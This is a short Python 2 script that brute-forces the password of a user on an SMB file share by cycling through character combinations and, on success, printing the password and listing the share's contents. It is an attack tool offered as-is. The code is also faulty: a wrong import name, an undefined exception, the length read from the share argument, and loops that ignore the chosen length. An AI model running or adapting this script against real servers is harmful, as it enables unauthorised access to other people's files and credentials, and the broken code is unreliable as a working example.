import sys, socket, pysmbclient

host = sys.argv[1]
user = sys.argv[2]
share = sys.argv[3]
domain = sys.argv[4]

try:
	length = int(sys.argv[3])
except IndexError as ner:
	length = 1

start_char = 65

def brute_force():
	chars = [127] * 11
	for a in range(start_char,chars[0]):
	  for b in range(start_char,chars[1]):
	    for c in range(start_char,chars[2]):
	      for d in range(start_char,chars[3]):
		for e in range(start_char,chars[4]):
		  for f in range(start_char,chars[5]):
	  	    for g in range(start_char,chars[6]):
	   	      for w in range(start_char,chars[7]):
		        for x in range(start_char,chars[8]):
		    	  for y in range(start_char,chars[9]):
			    for z in range(start_char,chars[10]):
			      	if length == 1:
			      		password = chr(z)
			      	elif length == 2:
					password = chr(y) + chr(z)
			      	elif length == 3:
					password = chr(x) + chr(y) + chr(z)
			      	elif length == 4:
					password = chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 5:
					password = chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 6:
					password = chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 7:
					password = chr(e) + chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 8:
					password = chr(d) + chr(e) + chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 9:
					password = chr(c) + chr(d) + chr(e) + chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 10:
					password = chr(b) + chr(c) + chr(d) + chr(e) + chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			      	elif length == 11:
					password = chr(a) + chr(b) + chr(c) + chr(d) + chr(e) + chr(f) + chr(g) + chr(w) + chr(x) + chr(y) + chr(z)
			     	penetration_status = try_password(password)
			     	if penetration_status == 1:
					print "Penetration detected!  The password for user " + user + " is: ", password
					sys.exit(0)


def try_password(password):
	print "Trying password: ", password
	try:
		smb = smbclient.SambaClient(server=host, share=share, username=user, password=password, domain=domain)
	except SambaError as ner:
		penetration_status = 0
	else:
		penetration_status = 1
		output = smb.listdir("/")
		print output
	return penetration_status

brute_force()
